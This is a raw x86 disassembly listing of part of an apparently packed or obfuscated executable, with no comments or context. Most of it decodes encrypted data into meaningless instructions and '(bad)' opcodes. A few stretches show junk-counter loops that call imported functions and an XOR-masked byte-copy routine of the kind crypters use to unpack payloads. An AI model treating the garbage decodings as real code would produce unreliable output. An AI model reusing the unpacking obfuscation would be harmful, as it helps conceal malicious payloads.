  40f2c7:	pop    ds
  40f2c8:	in     al,dx
  40f2c9:	adc    al,0x8c
  40f2cb:	jno    0x40f2fd
  40f2cd:	scas   eax,DWORD PTR es:[edi]
  40f2ce:	stos   BYTE PTR es:[edi],al
  40f2cf:	std    
  40f2d0:	popf   
  40f2d1:	jmp    0x40f2bf
  40f2d3:	ins    BYTE PTR es:[edi],dx
  40f2d4:	inc    eax
  40f2d5:	or     al,0xa9
  40f2d7:	dec    ebx
  40f2d8:	mov    ecx,DWORD PTR [ebx+0xb]
  40f2db:	fs ss pop ecx
  40f2de:	cwde   
  40f2df:	xor    BYTE PTR [ecx-0x70],cl
  40f2e2:	and    BYTE PTR [ebx-0x3988dd66],ah
  40f2e8:	lods   eax,DWORD PTR ds:[esi]
  40f2e9:	cmp    al,0x44
  40f2eb:	jp     0x40f2ab
  40f2ed:	imul   ebp,DWORD PTR [eax+0x4c],0xffffffc0
  40f2f1:	sbb    dh,dl
  40f2f3:	xchg   ebp,eax
  40f2f4:	add    esi,DWORD PTR [edx-0x6c]
  40f2f7:	in     al,0x1c
  40f2f9:	sbb    DWORD PTR [ebx],ebx
  40f2fb:	(bad)  
  40f2fd:	clc    
  40f2fe:	mov    DWORD PTR [ebp+0x6],edi
  40f301:	xor    al,BYTE PTR [edx]
  40f303:	test   al,0x5e
  40f305:	(bad)  
  40f306:	xor    eax,0x7375e2cf
  40f30b:	sti    
  40f30c:	jo     0x40f382
  40f30e:	or     dl,ch
  40f310:	add    eax,0xd378fbf
  40f315:	stos   DWORD PTR es:[edi],eax
  40f316:	mov    dh,BYTE PTR [ecx+edx*2-0x5e]
  40f31a:	aam    0xba
  40f31c:	bnd jl 0x40f2b4
  40f31f:	hlt    
  40f320:	ror    esp,cl
  40f322:	push   eax
  40f323:	add    al,0xdf
  40f325:	pop    esp
  40f326:	dec    esp
  40f327:	push   esp
  40f328:	xor    al,ch
  40f32a:	mov    ah,cl
  40f32c:	pop    ds
  40f32d:	inc    esi
  40f32e:	inc    eax
  40f32f:	fdiv   DWORD PTR [edx+edx*2-0x4d253ac6]
  40f336:	lock jmp 0x40f331
  40f339:	repz push ss
  40f33b:	imul   ecx
  40f33d:	and    bl,BYTE PTR [esi]
  40f33f:	test   bl,ch
  40f341:	mov    ?,WORD PTR ds:0x9caaa7bc
  40f347:	pushf  
  40f348:	mov    ebp,0x65776214
  40f34d:	outs   dx,DWORD PTR ds:[esi]
  40f34e:	out    0xc,al
  40f350:	and    al,0x2c
  40f352:	sub    eax,0xd6d70a4f
  40f357:	fnsave [ebx]
  40f359:	sub    edi,ebp
  40f35b:	(bad)  
  40f35c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f35d:	mov    ch,0x63
  40f35f:	clc    
  40f360:	xor    dl,BYTE PTR [esi+0x7d5052d4]
  40f366:	inc    eax
  40f367:	mov    ds:0xe00d7e61,eax
  40f36c:	outs   dx,BYTE PTR ds:[esi]
  40f36d:	shl    BYTE PTR [ecx+0x316b20ec],1
  40f373:	xchg   ebp,eax
  40f374:	mov    dh,0x93
  40f376:	add    edi,edi
  40f378:	mov    esi,0x60706e5e
  40f37d:	(bad)  
  40f37e:	mov    ds:0xb82307f9,eax
  40f383:	xor    DWORD PTR [ebp+0x2581f89c],eax
  40f389:	daa    
  40f38a:	cmp    BYTE PTR [ebx+0x0],al
  40f38d:	add    BYTE PTR [eax],al
  40f38f:	add    BYTE PTR [eax],al
  40f391:	xor    ecx,ecx
  40f393:	xor    ecx,DWORD PTR ds:0x433827
  40f399:	inc    ecx
  40f39a:	mov    DWORD PTR ds:0x433827,ecx
  40f3a0:	cmp    DWORD PTR ds:0x433827,0x7
  40f3a7:	jne    0x40f3b6
  40f3ad:	push   DWORD PTR [ebp-0x14]
  40f3b0:	call   DWORD PTR ds:0x41236c
  40f3b6:	cmp    DWORD PTR ds:0x433827,0x6
  40f3bd:	jne    0x40f3d0
  40f3c3:	mov    ecx,DWORD PTR ds:0x433827
  40f3c9:	inc    ecx
  40f3ca:	mov    DWORD PTR ds:0x433827,ecx
  40f3d0:	cmp    DWORD PTR ds:0x433827,0x17
  40f3d7:	jb     0x40f391
  40f3dd:	mov    edx,DWORD PTR ds:0x43372b
  40f3e3:	mov    ecx,DWORD PTR ds:0x433803
  40f3e9:	sub    edx,ecx
  40f3eb:	sub    edx,DWORD PTR [edx+ecx*1]
  40f3ee:	mov    DWORD PTR [ebp-0x8],eax
  40f3f1:	mov    DWORD PTR ds:0x433757,0x13
  40f3fb:	cmp    DWORD PTR ds:0x433757,0x0
  40f402:	je     0x40f4d8
  40f408:	cmp    DWORD PTR ds:0x433757,0x14
  40f40f:	jne    0x40f41b
  40f415:	call   DWORD PTR ds:0x412370
  40f41b:	mov    edx,DWORD PTR ds:0x433757
  40f421:	dec    edx
  40f422:	mov    DWORD PTR ds:0x433757,edx
  40f428:	jmp    0x40f3fb
  40f42d:	and    DWORD PTR ds:0x4337ef,0x0
  40f437:	mov    ecx,DWORD PTR ds:0x4337ef
  40f43d:	inc    ecx
  40f43e:	mov    DWORD PTR ds:0x4337ef,ecx
  40f444:	cmp    DWORD PTR ds:0x4337ef,0x8
  40f44b:	jne    0x40f45a
  40f451:	push   DWORD PTR [ebp-0x28]
  40f454:	call   DWORD PTR ds:0x4122ac
  40f45a:	cmp    DWORD PTR ds:0x4337ef,0x7
  40f461:	jne    0x40f474
  40f467:	mov    ecx,DWORD PTR ds:0x4337ef
  40f46d:	inc    ecx
  40f46e:	mov    DWORD PTR ds:0x4337ef,ecx
  40f474:	cmp    DWORD PTR ds:0x4337ef,0x15
  40f47b:	jb     0x40f437
  40f481:	and    DWORD PTR ds:0x4337db,0x0
  40f48b:	mov    edx,DWORD PTR ds:0x4337db
  40f491:	inc    edx
  40f492:	mov    DWORD PTR ds:0x4337db,edx
  40f498:	cmp    DWORD PTR ds:0x4337db,0x21
  40f49f:	jne    0x40f4bf
  40f4a5:	push   0x8bd6
  40f4aa:	push   0x433991
  40f4af:	push   0x4339e7
  40f4b4:	push   0x4339cb
  40f4b9:	call   DWORD PTR ds:0x4122b0
  40f4bf:	cmp    DWORD PTR ds:0x4337db,0x19
  40f4c6:	jb     0x40f48b
  40f4cc:	mov    ecx,DWORD PTR ds:0x433817
  40f4d2:	adc    DWORD PTR ds:0x433827,ecx
  40f4d8:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40f4df:	mov    edx,DWORD PTR [ebp-0x8]
  40f4e2:	push   esi
  40f4e3:	mov    ecx,0x7510854
  40f4e8:	xor    edx,ecx
  40f4ea:	mov    esi,0x32729b
  40f4ef:	push   edi
  40f4f0:	mov    edi,DWORD PTR [ebp+0x10]
  40f4f3:	add    edx,esi
  40f4f5:	cmp    edi,edx
  40f4f7:	je     0x40fbae
  40f4fd:	mov    edx,DWORD PTR [ebp-0x8]
  40f500:	mov    eax,DWORD PTR [ebp-0x4]
  40f503:	xor    eax,ecx
  40f505:	mov    edi,0xffcd8d65
  40f50a:	sub    edi,eax
  40f50c:	add    edi,DWORD PTR [ebp+0x10]
  40f50f:	xor    edx,ecx
  40f511:	add    edx,esi
  40f513:	cmp    edx,edi
  40f515:	ja     0x40fba9
  40f51b:	push   ebx
  40f51c:	jmp    0x40f526
  40f521:	mov    esi,0x32729b
  40f526:	mov    eax,DWORD PTR [ebp-0x8]
  40f529:	mov    edi,DWORD PTR [ebp-0x4]
  40f52c:	jmp    0x40f84b
  40f531:	and    al,0x6b
  40f533:	sbb    dl,BYTE PTR [esi+0x71]
  40f536:	push   edi
  40f537:	jo     0x40f5a2
  40f539:	dec    esi
  40f53a:	add    edi,DWORD PTR [eax-0x42d260c7]
  40f540:	xor    esp,edx
  40f542:	lods   al,BYTE PTR ds:[esi]
  40f543:	jle    0x40f5c3
  40f545:	jl     0x40f5c4
  40f547:	jle    0x40f5c7
  40f549:	out    0xa6,al
  40f54b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f54c:	jg     0x40f560
  40f54e:	imul   edi,DWORD PTR ds:0x961166a5,0xffffffea
  40f555:	cs out 0x75,al
  40f558:	and    al,0x69
  40f55a:	call   0x65b4:0x8e001595
  40f561:	sub    DWORD PTR [eax-0xce0039e],esi
  40f567:	in     eax,0xa8
  40f569:	xor    ah,BYTE PTR [ecx-0x6f]
  40f56c:	fs stos BYTE PTR es:[edi],al
  40f56e:	(bad)  
  40f570:	je     0x40f5dc
  40f572:	mov    edx,DWORD PTR [ebx]
  40f574:	cmp    al,0x56
  40f576:	(bad)  
  40f577:	aam    0x5
  40f579:	sti    
  40f57a:	inc    edx
  40f57b:	jne    0x40f501
  40f57d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f57e:	int    0x73
  40f580:	iret   
  40f581:	mov    esi,0x555a45ef
  40f586:	inc    esp
  40f587:	or     al,0x22
  40f589:	push   ds
  40f58a:	dec    esi
  40f58b:	(bad)  
  40f58c:	xlat   BYTE PTR ds:[ebx]
  40f58d:	adc    eax,0xfc0cfc3
  40f592:	out    dx,al
  40f593:	or     ecx,ecx
  40f595:	push   ebx
  40f596:	jb     0x40f565
  40f598:	shr    BYTE PTR [ebp+0x617eb2f8],0x46
  40f59f:	ss mov ebx,0x8cf888c7
  40f5a5:	lds    ebp,FWORD PTR ds:0xfcc6872c
  40f5ab:	lods   al,BYTE PTR ds:[esi]
  40f5ac:	mov    dh,0x31
  40f5ae:	pop    es
  40f5af:	mov    eax,0x8c3cc6d
  40f5b4:	xor    BYTE PTR [ecx+ebp*2+0x67376b8d],ch
  40f5bb:	sbb    esp,ebp
  40f5bd:	loop   0x40f540
  40f5bf:	lock popa 
  40f5c1:	cmp    DWORD PTR [ebp-0x793ba595],0x94b50418
  40f5cb:	xchg   cl,dl
  40f5cd:	jo     0x40f5ad
  40f5cf:	icebp  
  40f5d0:	xor    BYTE PTR [ecx+0x72],al
  40f5d3:	sbb    eax,0x741c5fef
  40f5d8:	aam    0x9f
  40f5da:	mov    al,ds:0xcb4c01b7
  40f5df:	xor    BYTE PTR [eax-0xe],0x68
  40f5e3:	clc    
  40f5e4:	dec    ecx
  40f5e5:	outs   dx,BYTE PTR ds:[esi]
  40f5e6:	repnz xor al,0x99
  40f5e9:	sbb    al,0xb2
  40f5eb:	out    0xfa,eax
  40f5ed:	push   ebx
  40f5ee:	dec    esp
  40f5ef:	mov    es,WORD PTR [ebx-0x7c]
  40f5f2:	into   
  40f5f3:	pop    esi
  40f5f4:	(bad)  
  40f5f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f5f6:	scas   eax,DWORD PTR es:[edi]
  40f5f7:	dec    edi
  40f5f8:	fs test eax,0xa0083886
  40f5fe:	jl     0x40f632
  40f600:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f601:	mov    ebp,0x2406f046
  40f606:	jbe    0x40f5dc
  40f608:	xchg   esp,eax
  40f609:	(bad)  
  40f60a:	(bad)  
  40f60b:	(bad)  
  40f60c:	mov    ebp,0x53bf741b
  40f611:	(bad)  
  40f612:	imul   ebp,DWORD PTR [ebx+0x2296c652],0x5e687718
  40f61c:	cmp    al,0x67
  40f61e:	ins    BYTE PTR es:[edi],dx
  40f61f:	out    dx,al
  40f620:	pop    ecx
  40f621:	mov    edx,0x3f04dde0
  40f626:	fld    TBYTE PTR [edi-0x78]
  40f629:	adc    ch,BYTE PTR [edx+0x6b]
  40f62c:	rcr    BYTE PTR [edx+0x41],0xd4
  40f630:	mov    BYTE PTR [edi+edx*2],cl
  40f633:	ror    DWORD PTR [ecx+ebx*8+0x37],1
  40f637:	loop   0x40f689
  40f639:	xor    ecx,ebx
  40f63b:	popa   
  40f63c:	sub    al,0x49
  40f63e:	rol    BYTE PTR [edi-0x742c9b3d],cl
  40f644:	scas   eax,DWORD PTR es:[edi]
  40f645:	dec    esp
  40f646:	lock dec ecx
  40f648:	cmp    eax,0xd5b8657e
  40f64d:	cli    
  40f64e:	pushf  
  40f64f:	ss mov ah,ch
  40f652:	(bad)  
  40f653:	out    dx,eax
  40f654:	imul   esp,DWORD PTR [esi-0x6e469701],0xde553dad
  40f65e:	imul   ebx,DWORD PTR [edi],0x4b
  40f661:	into   
  40f662:	jno    0x40f68a
  40f664:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f665:	adc    eax,0xf8576537
  40f66a:	(bad)  
  40f66b:	fdivr  st(0),st
  40f66d:	sahf   
  40f66e:	xor    al,0xf1
  40f670:	dec    ebx
  40f671:	jp     0x40f686
  40f673:	inc    eax
  40f674:	push   edx
  40f675:	dec    esp
  40f676:	icebp  
  40f677:	add    eax,0x393cb0d2
  40f67c:	popf   
  40f67d:	aaa    
  40f67e:	gs int 0x53
  40f681:	mov    WORD PTR [edi+0x3b],?
  40f684:	inc    ecx
  40f685:	adc    BYTE PTR [ecx+0x200601eb],al
  40f68b:	push   eax
  40f68c:	das    
  40f68d:	je     0x40f6bb
  40f68f:	mov    edx,ebx
  40f691:	sub    BYTE PTR [edx+ebp*8+0x143c4675],bh
  40f698:	cdq    
  40f699:	xchg   esi,eax
  40f69a:	push   ebp
  40f69b:	pop    edi
  40f69c:	arpl   WORD PTR [ebx+0x32],sp
  40f69f:	in     al,0x55
  40f6a1:	fwait
  40f6a2:	jae    0x40f64b
  40f6a4:	jo     0x40f71b
  40f6a6:	dec    esp
  40f6a7:	call   DWORD PTR [eax-0x657b6d86]
  40f6ad:	inc    ecx
  40f6ae:	jmp    0x1543:0xb345b93
  40f6b5:	test   BYTE PTR [ebp+0x74],ah
  40f6b8:	dec    esp
  40f6b9:	into   
  40f6ba:	xor    eax,0x76dfb613
  40f6bf:	sub    DWORD PTR [eax],ecx
  40f6c1:	es rcr bl,0xa5
  40f6c5:	pop    ebx
  40f6c6:	out    dx,eax
  40f6c7:	inc    esp
  40f6c8:	ficom  DWORD PTR [edx-0x31b15bb2]
  40f6ce:	cmc    
  40f6cf:	shl    DWORD PTR [ecx-0x2a],cl
  40f6d2:	leave  
  40f6d3:	xchg   ebp,eax
  40f6d4:	int    0xc3
  40f6d6:	jno    0x40f666
  40f6d8:	mov    al,ds:0xb81d6797
  40f6dd:	cmc    
  40f6de:	pushf  
  40f6df:	xor    eax,DWORD PTR [edi]
  40f6e1:	dec    esi
  40f6e2:	lea    esi,[edi]
  40f6e4:	xchg   ecx,eax
  40f6e5:	std    
  40f6e6:	jmp    0xbc199e8a
  40f6eb:	repz mov edi,0xdc6adaa7
  40f6f1:	jbe    0x40f67e
  40f6f3:	cwde   
  40f6f4:	xor    DWORD PTR [eax+edx*8],0x1c
  40f6f8:	shl    DWORD PTR [eax+0x4add9da],cl
  40f6fe:	enter  0x51ce,0xb
  40f702:	lds    ebx,FWORD PTR [ecx+0x623331cf]
  40f708:	test   WORD PTR [esi+ebp*1+0x36e69117],ax
  40f710:	jns    0x40f6d7
  40f712:	fimul  WORD PTR [esi-0x85dc726]
  40f718:	or     eax,0x953bf699
  40f71d:	pop    eax
  40f71e:	xor    al,0x64
  40f720:	(bad)  
  40f721:	mov    eax,0x7721f38c
  40f726:	sti    
  40f727:	adc    eax,DWORD PTR [edx]
  40f729:	repz aam 0xee
  40f72c:	sub    dh,ah
  40f72e:	pop    ebx
  40f72f:	or     BYTE PTR [edx],0x5b
  40f732:	sti    
  40f733:	mov    bl,0xf5
  40f735:	adc    DWORD PTR [edx+0xade2852],ebp
  40f73b:	push   ss
  40f73c:	inc    edx
  40f73d:	or     eax,ebx
  40f73f:	push   ebx
  40f740:	and    eax,0xf626b2e3
  40f745:	dec    edi
  40f746:	add    edx,0x75
  40f749:	test   DWORD PTR [edi],edi
  40f74b:	ret    
  40f74c:	pusha  
  40f74d:	stos   BYTE PTR es:[edi],al
  40f74e:	mov    DWORD PTR [edi+0x76],ecx
  40f751:	cld    
  40f752:	push   edi
  40f753:	sbb    eax,0x9782eedf
  40f758:	cmp    al,0xad
  40f75a:	cmp    esp,esi
  40f75c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f75d:	inc    edi
  40f75e:	shl    ebx,0xb7
  40f761:	mov    cl,0x4b
  40f763:	xchg   esp,eax
  40f764:	add    cl,cl
  40f766:	sub    WORD PTR [eax-0x70],bx
  40f76a:	pop    ds
  40f76b:	and    eax,0x8944c138
  40f770:	dec    ebx
  40f771:	fdivr  QWORD PTR [ebp+0x6e]
  40f774:	(bad)  
  40f776:	rcr    BYTE PTR [edi+ecx*1-0x79],cl
  40f77a:	icebp  
  40f77b:	mov    cl,0xde
  40f77d:	(bad)  
  40f77e:	aaa    
  40f77f:	sub    eax,0x68bf7a08
  40f784:	pop    ecx
  40f785:	ins    BYTE PTR es:[edi],dx
  40f786:	test   al,0x23
  40f788:	aad    0xaa
  40f78a:	sti    
  40f78b:	cmc    
  40f78c:	adc    al,0xb7
  40f78e:	or     eax,0xb813e09d
  40f793:	mov    dh,0xc9
  40f795:	das    
  40f796:	mov    al,0x9a
  40f798:	daa    
  40f799:	addr16 jns 0x40f793
  40f79c:	retf   
  40f79d:	or     dl,BYTE PTR [edx-0x28]
  40f7a0:	pusha  
  40f7a1:	(bad)  
  40f7a2:	loop   0x40f785
  40f7a4:	sbb    eax,0x15e9f8d5
  40f7a9:	xor    eax,0xd88292cc
  40f7ae:	(bad)  [esi+0x5cc024f4]
  40f7b4:	std    
  40f7b5:	jns    0x40f7ca
  40f7b7:	in     eax,dx
  40f7b8:	mov    edi,0x42c601c4
  40f7bd:	in     eax,0x80
  40f7bf:	loopne 0x40f790
  40f7c1:	push   ds
  40f7c2:	retf   
  40f7c3:	or     dh,bh
  40f7c5:	jp     0x40f771
  40f7c7:	jmp    0x40f7c3
  40f7c9:	dec    BYTE PTR [eax]
  40f7cb:	xor    BYTE PTR [ecx+0x7179c5c4],ah
  40f7d1:	mov    ebx,0x366e2317
  40f7d6:	add    BYTE PTR [ebp+ebx*4+0x27],cl
  40f7da:	hlt    
  40f7db:	pop    ss
  40f7dc:	lods   al,BYTE PTR ds:[esi]
  40f7dd:	outs   dx,BYTE PTR ds:[esi]
  40f7de:	jp     0x40f852
  40f7e0:	test   DWORD PTR [ebx+0x3b254c81],ebx
  40f7e6:	xchg   BYTE PTR [ebx+0xf62c1df],ch
  40f7ec:	pop    ss
  40f7ed:	mov    edx,0x86058d4d
  40f7f2:	cmp    bh,cl
  40f7f4:	popa   
  40f7f5:	bound  edx,QWORD PTR ds:[ebp-0x607048d3]
  40f7fc:	hlt    
  40f7fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f7fe:	mov    ebx,DWORD PTR [eax]
  40f800:	cli    
  40f801:	sbb    edx,ebp
  40f803:	push   cs
  40f804:	mov    ?,ebx
  40f806:	call   0xe32d:0xc3fb419c
  40f80d:	test   ah,bh
  40f80f:	fsubr  st,st(4)
  40f811:	and    eax,0x8ee0f134
  40f816:	jmp    ebp
  40f818:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f819:	pushf  
  40f81a:	push   ss
  40f81b:	push   ds
  40f81c:	js     0x40f818
  40f81e:	or     eax,0x13ad0d9b
  40f823:	or     BYTE PTR [ecx+ebp*4-0x52eaf34f],bh
  40f82a:	sub    eax,0xd7590047
  40f82f:	inc    ecx
  40f830:	mov    edi,0x49a8266e
  40f835:	dec    edi
  40f836:	leave  
  40f837:	ja     0x40f881
  40f839:	shr    BYTE PTR [edx+0x18],0x7e
  40f83d:	inc    ecx
  40f83e:	and    ah,bh
  40f840:	stos   DWORD PTR es:[edi],eax
  40f841:	mov    dl,0xea
  40f843:	mov    BYTE PTR [edx-0x2406fa54],dl
  40f849:	adc    esp,DWORD PTR [ebx]
  40f84b:	xor    edi,ecx
  40f84d:	add    edi,esi
  40f84f:	mov    esi,DWORD PTR [ebp+0x8]
  40f852:	imul   edi,edx
  40f855:	mov    ebx,DWORD PTR [ebp+0xc]
  40f858:	xor    eax,ecx
  40f85a:	add    eax,edx
  40f85c:	mov    al,BYTE PTR [ebx+eax*1+0x32729b]
  40f863:	mov    BYTE PTR [edi+esi*1],al
  40f866:	mov    eax,DWORD PTR [ebp-0x4]
  40f869:	xor    eax,ecx
  40f86b:	lea    edx,[edx+eax*1+0x32729b]
  40f872:	mov    eax,DWORD PTR [ebp-0x4]
  40f875:	xor    eax,ecx
  40f877:	mov    esi,0xffcd8d65
  40f87c:	sub    esi,eax
  40f87e:	add    esi,DWORD PTR [ebp+0x10]
  40f881:	cmp    edx,esi
  40f883:	jmp    0x40fba2
  40f888:	and    BYTE PTR [edi],0xc2
  40f88b:	in     eax,0x61
  40f88d:	loope  0x40f830
  40f88f:	arpl   WORD PTR [ecx-0x4b],bp
  40f892:	adc    eax,0x261f833f
  40f897:	aad    0xd2
  40f899:	stos   DWORD PTR es:[edi],eax
  40f89a:	jle    0x40f91a
  40f89c:	jl     0x40f91b
  40f89e:	jle    0x40f91e
  40f8a0:	aad    0x17
  40f8a2:	into   
  40f8a3:	fistp  WORD PTR [edx]
  40f8a5:	mov    dh,0xe3
  40f8a7:	ja     0x40f839
  40f8a9:	xchg   ecx,eax
  40f8aa:	jmp    0x40f918
  40f8ac:	mov    ah,0xaa
  40f8ae:	aaa    
  40f8af:	imul   ecx,DWORD PTR [ebx+0x1d93e4d1],0xffffff98
  40f8b6:	ss pop ebp
  40f8b8:	xchg   esi,eax
  40f8b9:	and    BYTE PTR [esp+ebp*1],bl
  40f8bc:	cwde   
  40f8bd:	push   cs
  40f8be:	mov    ecx,esp
  40f8c0:	push   0x7c
  40f8c2:	scas   eax,DWORD PTR es:[edi]
  40f8c3:	(bad)  
  40f8c4:	fnstsw WORD PTR [edi-0x1e57fe35]
  40f8ca:	inc    ecx
  40f8cb:	or     edx,0x27
  40f8ce:	dec    edx
  40f8cf:	in     eax,0xa
  40f8d1:	xchg   DWORD PTR [ecx],esi
  40f8d3:	or     dh,dh
  40f8d5:	hlt    
  40f8d6:	xchg   edi,eax
  40f8d7:	stos   BYTE PTR es:[edi],al
  40f8d8:	jg     0x40f86c
  40f8da:	mov    ds:0x66079265,eax
  40f8df:	aas    
  40f8e0:	int    0xe0
  40f8e2:	fwait
  40f8e3:	sbb    edi,ebp
  40f8e5:	xor    DWORD PTR [ebx+0x13cbbe5a],esp
  40f8eb:	sub    cl,BYTE PTR [ecx]
  40f8ed:	push   ebx
  40f8ee:	sub    DWORD PTR [ebx-0x20],esp
  40f8f1:	push   es
  40f8f2:	xchg   ebp,eax
  40f8f3:	stc    
  40f8f4:	xlat   BYTE PTR ds:[ebx]
  40f8f5:	dec    ecx
  40f8f6:	cmp    DWORD PTR [edi+edi*1],eax
  40f8f9:	mov    dh,0xe6
  40f8fb:	ret    0xe5cb
  40f8fe:	clc    
  40f8ff:	jecxz  0x40f889
  40f901:	push   ds
  40f902:	je     0x40f97d
  40f904:	mov    DWORD PTR [ecx-0x71],edx
  40f907:	fcmove st,st(6)
  40f909:	mov    cl,0x2c
  40f90b:	(bad)  
  40f90c:	push   edx
  40f90d:	mov    cs,esp
  40f90f:	adc    BYTE PTR [edi+0x3307f625],cl
  40f915:	popf   
  40f916:	xor    dh,al
  40f918:	inc    edi
  40f919:	xchg   edi,eax
  40f91a:	xchg   ebp,eax
  40f91b:	mov    ebp,0x85c49c0d
  40f920:	icebp  
  40f921:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f922:	sub    esi,0xffffff89
  40f925:	and    ah,ah
  40f927:	sti    
  40f928:	dec    edi
  40f929:	in     al,0x68
  40f92b:	dec    ecx
  40f92c:	sbb    dh,BYTE PTR [esp+ecx*2]
  40f92f:	test   ebx,esi
  40f931:	icebp  
  40f932:	iret   
  40f933:	scas   al,BYTE PTR es:[edi]
  40f934:	repnz or BYTE PTR [ebx-0x12],dh
  40f938:	rep outs dx,BYTE PTR ds:[esi]
  40f93a:	xor    ecx,DWORD PTR [eax-0x7bd05ec4]
  40f940:	sub    al,0x79
  40f942:	(bad)  
  40f943:	stc    
  40f944:	pop    ebp
  40f945:	inc    esi
  40f946:	sbb    eax,0xd8847219
  40f94b:	repz cmp edi,DWORD PTR [edi]
  40f94e:	gs aaa 
  40f950:	(bad)  
  40f951:	fs call 0xa32:0x74ea6d92
  40f959:	rol    esi,0x5b
  40f95c:	imul   edi,DWORD PTR [edx+0x6e94ea18],0xfb053c6e
  40f966:	jne    0x40f942
  40f968:	and    esp,DWORD PTR [ecx+eax*1+0x6e]
  40f96c:	lahf   
  40f96d:	jl     0x40f93b
  40f96f:	shr    BYTE PTR [ecx+0x1c],1
  40f972:	aaa    
  40f973:	pop    edx
  40f974:	pop    esp
  40f975:	pushf  
  40f976:	mov    bl,0x1e
  40f978:	xlat   BYTE PTR ds:[ebx]
  40f979:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f97a:	iret   
  40f97b:	jmp    0x40f93b
  40f97d:	push   edx
  40f97e:	imul   esp,edi,0xffffffad
  40f981:	ret    0x1b11
  40f984:	push   ebp
  40f985:	mov    ebp,0xf9e89f10
  40f98a:	mov    bl,0x2b
  40f98c:	pop    ebx
  40f98d:	(bad)  
  40f98f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f990:	and    edx,ecx
  40f992:	xchg   edi,eax
  40f993:	outs   dx,BYTE PTR ds:[esi]
  40f994:	lock pop ss
  40f996:	xchg   BYTE PTR [ecx-0x1c],al
  40f999:	push   ebp
  40f99a:	mov    WORD PTR [ecx+0x9ee3935],es
  40f9a0:	jl     0x40f99d
  40f9a2:	imul   ebp,DWORD PTR [ebp+ecx*4-0x25e28bb8],0xffffff8d
  40f9aa:	(bad)  
  40f9ab:	and    eax,0xca09f80
  40f9b0:	ins    BYTE PTR es:[edi],dx
  40f9b1:	call   0xb944:0x66190f8
  40f9b8:	popf   
  40f9b9:	sbb    ebp,DWORD PTR [eax+0x11]
  40f9bc:	popa   
  40f9bd:	hlt    
  40f9be:	imul   eax,DWORD PTR [ecx-0x76f820cb],0xf6de7a48
  40f9c8:	loop   0x40f99f
  40f9ca:	loopne 0x40fa28
  40f9cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f9cd:	push   es
  40f9ce:	inc    edi
  40f9cf:	(bad)  
  40f9d0:	call   0x3197f120
  40f9d5:	stc    
  40f9d6:	jb     0x40f96c
  40f9d8:	(bad)  
  40f9d9:	mov    eax,ds:0xd54ef8a9
  40f9de:	dec    ecx
  40f9df:	dec    ebp
  40f9e0:	xchg   esp,eax
  40f9e1:	ror    BYTE PTR [ebx-0x3c],1
  40f9e4:	cld    
  40f9e5:	mov    dl,BYTE PTR [esi-0x28]
  40f9e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f9e9:	sub    BYTE PTR [ecx+0x1a902810],dl
  40f9ef:	jno    0x40fa3f
  40f9f1:	sub    edi,DWORD PTR [ecx+0x10]
  40f9f4:	jg     0x40fa6f
  40f9f6:	push   0xffffffa8
  40f9f8:	scas   al,BYTE PTR es:[edi]
  40f9f9:	and    edx,DWORD PTR [esi+0x5585f314]
  40f9ff:	add    al,0x69
  40fa01:	in     eax,dx
  40fa02:	sub    dl,BYTE PTR [edi]
  40fa04:	add    BYTE PTR [ecx-0x622b8cad],ah
  40fa0a:	push   es
  40fa0b:	adc    al,0x66
  40fa0d:	cmp    bh,BYTE PTR [ecx-0x1eb9dbb3]
  40fa13:	test   DWORD PTR [eax-0x4],esp
  40fa16:	out    0x94,al
  40fa18:	sbb    ebx,DWORD PTR [edx+0x740637f8]
  40fa1e:	rol    DWORD PTR [ecx-0x5c],cl
  40fa21:	aad    0xae
  40fa23:	adc    eax,DWORD PTR [ebp+0x20]
  40fa26:	leave  
  40fa27:	cmc    
  40fa28:	or     cl,al
  40fa2a:	daa    
  40fa2b:	push   edx
  40fa2c:	pop    esi
  40fa2d:	pop    edx
  40fa2e:	outs   dx,BYTE PTR ds:[esi]
  40fa2f:	sbb    eax,0x8016d1e8
  40fa34:	mov    cl,0xbd
  40fa36:	leave  
  40fa37:	das    
  40fa38:	sahf   
  40fa39:	jle    0x40f9d2
  40fa3b:	sub    eax,DWORD PTR [ecx]
  40fa3d:	push   ebx
  40fa3e:	test   eax,esp
  40fa40:	and    al,0x72
  40fa42:	in     al,0xd0
  40fa44:	or     eax,0xf4625b17
  40fa49:	xor    BYTE PTR [ecx-0xd59d2e8],al
  40fa4f:	sub    eax,0x6cc7b60b
  40fa54:	aam    0x8
  40fa56:	test   DWORD PTR [ebx],esp
  40fa58:	mov    eax,DWORD PTR ds:0xe2b2e2a1
  40fa5e:	ss (bad) 
  40fa60:	dec    ebx
  40fa61:	lea    ecx,ds:0xfb815c68
  40fa67:	jecxz  0x40fa22
  40fa69:	and    BYTE PTR [ebx+0x559c6a9a],ch
  40fa6f:	fist   DWORD PTR [edx-0x63037112]
  40fa75:	jecxz  0x40faad
  40fa77:	idiv   BYTE PTR [ecx+0x20cb2a32]
  40fa7d:	test   eax,0x73e62422
  40fa82:	xchg   edi,eax
  40fa83:	dec    ah
  40fa85:	mov    al,al
  40fa87:	popa   
  40fa88:	lea    ebx,[edi+0x1d4eb4a8]
  40fa8e:	pop    edi
  40fa8f:	repz and al,0x9a
  40fa92:	ins    DWORD PTR es:[edi],dx
  40fa93:	sub    al,0xf9
  40fa95:	call   0x2a4aec00
  40fa9a:	add    eax,0x78
  40fa9d:	inc    ebx
  40fa9e:	or     al,BYTE PTR [ebx+0x5f]
  40faa1:	jae    0x40fa3a
  40faa3:	inc    eax
  40faa4:	mov    esp,DWORD PTR es:[eax]
  40faa7:	cmc    
  40faa8:	jno    0x40fa6e
  40faaa:	rol    edi,1
  40faac:	outs   dx,DWORD PTR ds:[esi]
  40faad:	fs cs int3 
